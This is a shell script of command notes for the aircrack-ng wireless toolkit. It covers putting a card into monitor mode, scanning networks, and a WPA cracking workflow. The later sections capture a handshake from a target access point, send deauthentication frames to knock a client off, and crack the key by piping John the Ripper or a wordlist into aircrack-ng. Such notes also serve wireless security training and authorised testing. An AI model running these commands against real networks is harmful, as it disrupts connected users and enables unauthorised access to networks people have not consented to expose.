#!/bin/sh

#----------------------------------------------------------------------------------------#
#	put wireless card into monitor mode  #
#----------------------------------------------------------------------------------------#


# start monitor mode
airmon-ng start wlan0

# stop monitor mode
airmon-ng stop mon0

# show wifi set up
iwconfig

# show loaded drivers
airdriver-ng loaded

# show usb wifi card
lsusb 

# show physical drivers - note the phy number in brackets [phy6]
airmon-ng

# show physical drivers use phy number in brackets from airmon-ng
iw phy phy6 info | grep -A8 modes 


# managed mode
iwconfig wlan0 mode managed

# connect to open essid
iwconfig wlan0 essid networkname

# ad hoc mode
iwconfig wlan0 channel 1 essid myadhocnetwork mode ad-hoc

# start scanning in monitor mode
airodump-ng mon0

#----------------------------------------------------------------------------------------#
#	standard streams and wpa cracking  #
#----------------------------------------------------------------------------------------#

# john the ripper

# aircrack-ng needs 3 things

# 1 - bssid of access point

# 2 - packet capture file containing handshake

# 3 - wordlist

# pipe john the ripper incremental dictonary to aircrack-ng
john --incremental --stdout | aircrack-ng -b 00:12:cf:a4:5b:55 -w - /root/lo1-01.cap



#--------------------------------------------------------------------------------------#

# put card into monitor mode
airmon-ng start wlan0 (channel number)

# eg
# 
# airmon-ng start wifi0 11
# 
# for channel 11
airodump-ng -c 11 --bssid (bssid) -w psk mon0


# eg 
# 
# airodump-ng -c 11 --bssid 00:18:4d:3a:fe:e8 -w psk mon0


# de authenticate 
aireplay-ng -0 5 -a ( access point bssid ) -c (client bssid ) mon0


# word list
aircrack-ng -w word.lst -b (access point)  psk*.cap


